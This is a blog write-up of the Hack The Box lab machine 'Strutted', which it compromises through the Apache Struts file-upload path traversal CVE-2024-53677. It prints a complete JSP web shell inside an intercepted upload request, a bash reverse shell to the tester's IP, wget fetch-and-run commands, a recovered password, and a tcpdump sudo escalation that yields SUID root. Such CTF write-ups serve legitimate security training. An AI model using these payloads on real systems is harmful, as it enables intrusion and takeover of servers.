---
title: 'HTB Strutted Writeup'
date: 2025-06-23
permalink: /posts/2025/06/HTB_Strutted_Writeup/
tags:
  - HTB
  - writeup
  - medium
---

A writeup of the Hack The Box machine "Strutted" with medium difficulty


HTB_Strutted
======

Hello World! and welcome to this writeup of the Medium rated Hack The Box Linux machine: Strutted

<img src='/images/HTB_Strutted/image.png'>

This is the first medium difficulty machine I am trying to pawn. Until now I have only tried easy machines and some of them I found already very challenging. I’m excited but also scared to try this harder machine. Let’s get into it.

# Enumeration

First, I run Nmap to scan for open ports on the target machine: `nmap -sV -sC 10.10.11.59`

<img src='/images/HTB_Strutted/image 1.png'>

We can see that port 22 and 80 are open. Also this confirms that the machine is running Linux.

It also runs a website in port 80: `http://strutted.htb` . Let’s add the Ip and domain to the `/etc/hosts` file: `echo "10.10.11.59 strutted.htb" | sudo tee -a /etc/hosts`

Now we can access the web page and see what it has to offer:

<img src='/images/HTB_Strutted/image 2.png'>

This looks like an upload site where you can upload your images and share them with a created link. Also in the section below is noted that the Strutted setup that we are seeing is provided by a Docker image which can be downloaded. 

We can maybe get some useful information out of this Docker image.

In the “How It Works” tab you can see the accepted image formats: JPG, JPEG, PNG, GIF.

The images are stored on the server I presume. 

Let’s download the Docker image: `strutted.zip` and unzip it with `unzip srutted.zip`

<img src='/images/HTB_Strutted/image 3.png'>

Now in the code I see that apache maven POM 4.0.0 is used and strust2 version 6.3.0.1 in the `pom.xml` file. 

In the `Upload.java` file can be seen how the upload process of an image works. The base upload dir is /webapps/ROOT/uploads. So is this dir a root folder? And in the strtus.xml are paths such as /upload.jsp and /success.jsp. 

I also found something very interesting in the `/target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst` :

<img src='/images/HTB_Strutted/image 4.png'>

Let’s search this CVE:

CVE-2024-53677: File upload logic in Apache Struts is flawed. An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution.

This is for Apache Struts before versions 6.4.0 and we saw earlier that version 6.3.0.1 is running on the target machine. 
This vulnerability arises from a flaw in the file upload mechanism “[FileUploadInterceptor](https://struts.apache.org/core-developers/file-upload-interceptor)”, a component within the default stack **that **stores the file during the data file transfer operation. The vulnerable [file-upload](https://struts.apache.org/core-developers/file-upload-interceptor) mechanism allows attackers to exploit a path traversal by uploading malicious files to *the FileUploadInterceptor* component to access it. Applications that do not use the *FileUploadInterceptor* component are unaffected.

Let’s see if our target uses the *FileUploadInterceptor* component:

<img src='/images/HTB_Strutted/image 5.png'>

Yes, this looks like it does.

Let’s see if Metasploit has an available exploit for this CVE:

Nope, does not look like it.

I found a GitHub project with an exploit: https://github.com/EQSTLab/CVE-2024-53677

Let’s try this one:

`sudo apt install python3-venv`

`python3 -m venv venv`
`source venv/bin/activate`

`git clone https://github.com/EQSTLab/CVE-2024-53677.git` 
`cd CVE-2024-53677` 

`pip install -r requirements.txt` 

Or if you are risky: `sudo pip install --break-system-packages -r requirements.txt` 

Now, upload the default file with this command:

(sudo)`python CVE-2024-53677.py -u http://strutted.htb/upload.action -p ../test.jsp` 

<img src='/images/HTB_Strutted/image 6.png'>

<img src='/images/HTB_Strutted/image 7.png'>

Now let’s see if we can access this uploaded file: 

So I could not find the uploaded file

Let’s try it another way with Burp suite:

Intercept the upload request with the Burp suite intercept on:

<img src='/images/HTB_Strutted/image 8.png'>

Send this request to the Repeater and paste [this](https://raw.githubusercontent.com/TAM-K592/CVE-2024-53677-S2-067/refs/heads/ALOK/shell.jsp) payload into the request like so:

<img src='/images/HTB_Strutted/image 9.png'>

And at the end of the request paste this:

```
-----------------------------815920776247890722980599935
Content-Disposition: form-data; name="top.UploadFileName"

../../shell.jsp
```

So now the complete request looks like this:

```
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------30214330314442822631212062236
Content-Length: 226
Origin: http://strutted.htb
Connection: keep-alive
Referer: http://strutted.htb/upload.action
Cookie: JSESSIONID=AA34B64913C652F82964068D83971203
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------30214330314442822631212062236
Content-Disposition: form-data; name="Upload"; filename="shell.jpg"
Content-Type: image/jpeg

ÿØÿà
<%@ page import="java.io.*, java.util.*, java.net.*" %>
<%
    String action = request.getParameter("action");
    String output = "";

    try {
        if ("cmd".equals(action)) {
            // Execute system commands
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output += line + "\n";
                }
                reader.close();
            }
        } else if ("upload".equals(action)) {
            // File upload
            String filePath = request.getParameter("path");
            String fileContent = request.getParameter("content");
            if (filePath != null && fileContent != null) {
                File file = new File(filePath);
                try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                    writer.write(fileContent);
                }
                output = "File uploaded to: " + filePath;
            } else {
                output = "Invalid file upload parameters.";
            }
        } else if ("list".equals(action)) {
            // List directory contents
            String dirPath = request.getParameter("path");
            if (dirPath != null) {
                File dir = new File(dirPath);
                if (dir.isDirectory()) {
                    for (File file : Objects.requireNonNull(dir.listFiles())) {
                        output += file.getName() + (file.isDirectory() ? "/" : "") + "\n";
                    }
                } else {
                    output = "Path is not a directory.";
                }
            } else {
                output = "No directory path provided.";
            }
        } else if ("delete".equals(action)) {
            // Delete files
            String filePath = request.getParameter("path");
            if (filePath != null) {
                File file = new File(filePath);
                if (file.delete()) {
                    output = "File deleted: " + filePath;
                } else {
                    output = "Failed to delete file: " + filePath;
                }
            } else {
                output = "No file path provided.";
            }
        } else {
            // Unknown operation
            output = "Unknown action: " + action;
        }
    } catch (Exception e) {
        output = "Error: " + e.getMessage();
    }

    // Return the result
    response.setContentType("text/plain");
    out.print(output);
%>
-----------------------------30214330314442822631212062236
Content-Disposition: form-data; name="top.UploadFileName"

../../shell.jsp
-----------------------------30214330314442822631212062236--

```

Now click on send to send the request to the webserver.

I got this error: 

<img src='/images/HTB_Strutted/image 10.png'>

Ah wait, I see it now. Stupid….

I have to upload an image first, and then intercept the upload request and replace the uploaded image data with out script.

<img src='/images/HTB_Strutted/image 11.png'>

Now, test for the code execution in the web browser:

`http://strutted.htb/shell.jsp?action=cmd&cmd=id`

For a while I got stuck here, but apparently you had to change the “upload” to “Upload”:

<img src='/images/HTB_Strutted/image 12.png'>

<img src='/images/HTB_Strutted/image 13.png'>

Now the file path traversal worked!

Now trying: `http://strutted.htb/shell.jsp?action=cmd&cmd=id` :

<img src='/images/HTB_Strutted/image 14.png'>

Yes this time it works! We can see the output of the id command, the user is named `tomcat` as we can see.

Now we need to gain a reverse shell which is possible what we know now. We need to upload a reverse shell script to the target. Create a file with the following command:

`echo -ne '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.100/4444 0>&1"' > bash.sh`

`echo -ne`: -n: no new line on the end, -e: interpreter escape-sequencies such as \n
`#!/bin/bash`:	Shebang → make the file executable as bash-script
`\n`:	A new rule between shebang and the rest of the script
`bash -c "..."`:	Let’s bash run a commando as a string
`bash -i >& /dev/tcp/10.10.14.100/4444 0>&1`:	Reverse shell to your IP (10.10.14.100) on port 4444

`bash.sh`	Writes the output to a new file bash.sh

After that, start a python web server:

`python3 -m http.server 80` 

In a new terminal run a Netcat listener:

`nc -lvvp 4444` 

From the website execute the following commands:

`http://strutted.htb/shell.jsp?action=cmd&cmd=wget+10.10.14.100/bash.sh+-O+/tmp/bash.sh`

`http://strutted.htb/shell.jsp?action=cmd&cmd=chmod+777+/tmp/bash.sh`

`http://strutted.htb/shell.jsp?action=cmd&cmd=/tmp/bash.sh`

<img src='/images/HTB_Strutted/image 15.png'>

<img src='/images/HTB_Strutted/image 16.png'>

We gained the shell. After enumerating the files, in the /conf/tomcat-users.xml file are usernames and a password of the admin user that should have been changed:

<img src='/images/HTB_Strutted/image 17.png'>

IT14d6SSP81k

Running the `cat /etc/passwd` command we can see what users have a shell and as we can see is this the user james:

<img src='/images/HTB_Strutted/image 18.png'>

Let’s try to SSH to the user james: `ssh james@10.10.11.59`

<img src='/images/HTB_Strutted/image 19.png'>

Yep, that worked! As you can see the user flag is captured.

# Privilege Escalation

We are in now and we can continue to try and become root. We can check what sudo privileges we have with `sudo -l`. 

<img src='/images/HTB_Strutted/image 20.png'>

Well well we have sudo in the `/usr/sbin/tcpdump` folder. 

Let’s search for an available exploit using this. The first result looks promising: [https://gtfobins.github.io/gtfobins/tcpdump/](https://gtfobins.github.io/gtfobins/tcpdump/)

Here are some commands listed we can use to elevate the privileges.

Run these following commands:

```bash
COMMAND='cp /bin/bash /tmp/bash_root && chmod +s /tmp/bash_root'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

The `COMMAND='...'` command copies `/bin/bash` to `/tmp/bash_root` and changes the **SUID-bit.** The file can always be executed as root this way.

The `TF`, `echo` and `chmod` command create a temporary executable script that executes the `COMMAND='...'` .`TF` is the path to the script.

Lastly the `sudo tcpdump` command:

`i lo`	Listens on the loopback-interface

`-w /dev/null`	Writes nothing in the file

`-G 1`	Split the capture every 1 second

`-W 1`	1 file

`-z $TF`	After every fileswitch, execute $TF as a script

`-Z root` Execute the script as the user root (This is the vulnerability)

<img src='/images/HTB_Strutted/image 21.png'>

Now run `ls -l /tmp/bash_root`:

<img src='/images/HTB_Strutted/image 22.png'>

Execute this file: `/tmp/bash_root -p` 

The -p flag ensures that the root privileges dont get dropped.

<img src='/images/HTB_Strutted/image 23.png'>

We are root and the flag can be found in `/root/root.txt` .

<img src='/images/HTB_Strutted/image 24.png'>

# Conclusion

This was my very first medium machine I tried and I found this one very fun. It was not way harder than an easy machine, but still challenging for me. Especially the file upload request intercept part where I struggled the most amount of time. 

Well that was enough for today, thank you for reading and see you in the next one!